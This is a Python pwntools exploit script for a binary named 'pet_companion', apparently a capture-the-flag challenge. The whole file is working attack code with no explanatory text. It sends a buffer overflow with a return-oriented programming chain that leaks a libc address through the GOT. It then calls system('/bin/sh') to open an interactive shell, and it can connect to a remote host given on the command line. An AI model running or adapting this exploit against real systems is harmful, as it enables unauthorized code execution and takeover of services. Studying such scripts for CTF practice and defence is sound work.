#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF('pet_companion')
libc = exe.libc

filterwarnings("ignore")
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()

def solve():
    offset = 72
    pop_rdi = 0x0000000000400743 # pop rdi; ret; 
    pop_rsi_r15 = 0x0000000000400741 # pop rsi; pop r15; ret;

    payload = flat({
        offset: [
            pop_rdi,
            0x1,
            pop_rsi_r15,
            exe.got['read'],
            0x0,
            exe.plt['write'],
            exe.sym['main']
        ]
    })

    io.sendline(payload)
    io.recvuntil('Configuring...\n\n')
    leak = u64(io.recv(8).ljust(8, b'\x00'))
    libc.address = leak - 0x110020

    info("libc base: %#x", libc.address)

    sh = next(libc.search(b'/bin/sh\x00'))
    system = libc.address + 0x4f420
    ret = 0x00000000004004de # ret; 

    payload = flat({
        offset: [
            pop_rdi,
            sh,
            system
        ]
    })

    io.sendline(payload)

    io.interactive()

def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

